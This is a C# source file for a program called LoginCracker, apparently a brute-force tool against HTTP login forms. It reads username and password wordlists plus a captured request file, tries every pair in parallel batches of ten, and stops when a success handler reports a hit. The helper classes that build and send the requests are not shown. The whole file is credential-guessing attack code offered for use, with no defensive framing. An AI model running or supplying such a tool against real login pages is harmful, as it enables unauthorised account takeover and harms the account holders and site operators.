using System;
using System.Collections.Concurrent;
using System.IO;
using System.Threading.Tasks;

namespace LoginCracker
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            Console.WriteLine("input userName file path");
            var namePath = Console.ReadLine();
            while (string.IsNullOrEmpty(namePath))
            {
                Console.WriteLine("input userName file path");
                namePath = Console.ReadLine();
            }
            Console.WriteLine("input password file path");
            var passPath = Console.ReadLine();
            while (string.IsNullOrEmpty(passPath))
            {
                Console.WriteLine("input password file path");
                passPath = Console.ReadLine();
            }
            Console.WriteLine("input request file path");
            var reqFilePath = Console.ReadLine();
            while (string.IsNullOrEmpty(reqFilePath))
            {
                Console.WriteLine("input request file path");
                reqFilePath = Console.ReadLine();
            }

            var httpFileReader = new HttpFileReader(reqFilePath);
            var successHandler = SuccessHandlerConfig.Handler;

            using (var nameReader = new StreamReader(namePath))
            {
                var userName = "";
                var password = "";
                var count = 0;
                ConcurrentBag<Task<string>> tasks = null;
                while ((userName = nameReader.ReadLine()) != null)
                {
                    using (var passReader = new StreamReader(passPath))
                    {
                        while ((password = passReader.ReadLine()) != null)
                        {
                            if (count == 0)
                            {
                                tasks = new ConcurrentBag<Task<string>>();
                            }

                            Console.WriteLine("try to test {0} {1}", userName, password);

                            var httpReq = HttpFactory.CreateHttp(httpFileReader, userName, password);
                            if (httpReq != null)
                            {
                                var task = HttpTask.CreateTask(httpReq, successHandler, userName, password);
                                task.ContinueWith(
                                    r =>
                                    {
                                        if (!string.IsNullOrEmpty(r.Result))
                                        {
                                            Console.WriteLine(r.Result);
                                            HttpTask.CancellationToken.Cancel();
                                        }
                                    });
                                tasks.Add(task);
                                count++;
                                if (count == 10)
                                {
                                    try
                                    {
                                        Task.WaitAll(tasks.ToArray());
                                        tasks = new ConcurrentBag<Task<string>>();
                                        count = 0;
                                    }
                                    catch (AggregateException exc)
                                    {
                                        break;
                                    }
                                }
                            }

                        }
                    }
                }
            }

            var key = Console.ReadLine();
        }
    }
}